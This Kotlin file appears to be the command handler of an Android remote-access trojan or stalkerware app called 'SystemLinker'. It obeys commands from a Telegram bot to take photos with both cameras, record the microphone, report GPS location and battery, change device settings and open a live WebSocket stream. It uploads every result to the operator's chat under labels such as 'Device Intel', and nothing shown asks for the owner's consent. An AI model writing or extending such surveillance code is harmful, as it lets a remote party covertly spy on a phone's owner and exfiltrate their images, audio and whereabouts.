package com.systemlinker.features

import android.content.Context
import com.systemlinker.base.ErrorLogger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

class CommandProcessor(
    private val context: Context,
    private val telegramBotToken: String,
    private val adminChatId: Long
) {
    private val uploader = TelegramUploader(context, telegramBotToken, adminChatId)
    private val liveSessionManager = LiveSessionManager(context)
    private val mediaHandler = MediaHandler(context)
    private val systemHandler = SystemHandler(context)
    private val processorScope = CoroutineScope(Dispatchers.IO)

    fun execute(payload: JSONObject) {
        val cmd = payload.optString("cmd", "")
        val arg = payload.optString("arg", "")

        processorScope.launch {
            try {
                when (cmd) {
                    "ping" -> {
                        val bat = systemHandler.getBatteryStatus()
                        uploader.sendText("🟢 Device Online\n$bat")
                    }
                    "cam_front" -> {
                        uploader.sendText("Capturing front camera...")
                        val file = mediaHandler.takePicture(isFront = true)
                        if (file != null) uploader.sendFile(file, "photo", "Front Camera")
                        else uploader.sendText("Camera capture failed.")
                    }
                    "cam_back" -> {
                        uploader.sendText("Capturing back camera...")
                        val file = mediaHandler.takePicture(isFront = false)
                        if (file != null) uploader.sendFile(file, "photo", "Back Camera")
                        else uploader.sendText("Camera capture failed.")
                    }
                    "mic" -> {
                        val duration = arg.toIntOrNull() ?: 15
                        uploader.sendText("Recording mic for ${duration}s...")
                        val file = mediaHandler.recordAudio(duration)
                        if (file != null) uploader.sendFile(file, "audio", "Mic Record (${duration}s)")
                        else uploader.sendText("Mic recording failed.")
                    }
                    "loc" -> {
                        uploader.sendText("Fetching location...")
                        uploader.sendText(systemHandler.getLocation())
                    }
                    "flash" -> {
                        val enable = arg == "on"
                        uploader.sendText(systemHandler.setFlashlight(enable))
                    }
                    "vol" -> {
                        val level = arg.toIntOrNull() ?: return@launch
                        systemHandler.setVolume(level)
                        uploader.sendText("Volume set to $level%")
                    }
                    "info" -> {
                        val bat = systemHandler.getBatteryStatus()
                        val loc = systemHandler.getLocation()
                        uploader.sendText("*Device Intel*\n$bat\n$loc")
                    }
                    "get_log" -> {
                        uploader.sendText("Uploading error logs...")
                        val logFile = ErrorLogger.getLogFile(context)
                        uploader.sendDocument(logFile, "SystemLinker Error Logs")
                    }
                    "clear_log" -> {
                        ErrorLogger.clearLogs(context)
                        uploader.sendText("Error logs cleared.")
                    }
                    "live_start" -> {
                        // arg should be the WebSocket URL, e.g., "wss://your-server.tailnet.ts.net/live"
                        if (arg.startsWith("ws")) {
                            uploader.sendText("Initiating Live WebSocket Connection...")
                            liveSessionManager.connect(arg)
                        } else {
                            uploader.sendText("Error: Invalid WebSocket URL provided.")
                        }
                    }
                    "live_stop" -> {
                        liveSessionManager.disconnect()
                        uploader.sendText("Live Session Terminated.")
                    }
                }
            } catch (e: Exception) {
                ErrorLogger.logError(context, "CommandExecute_${cmd}", e)
                uploader.sendText("Execution failed for command: $cmd")
            }
        }
    }
}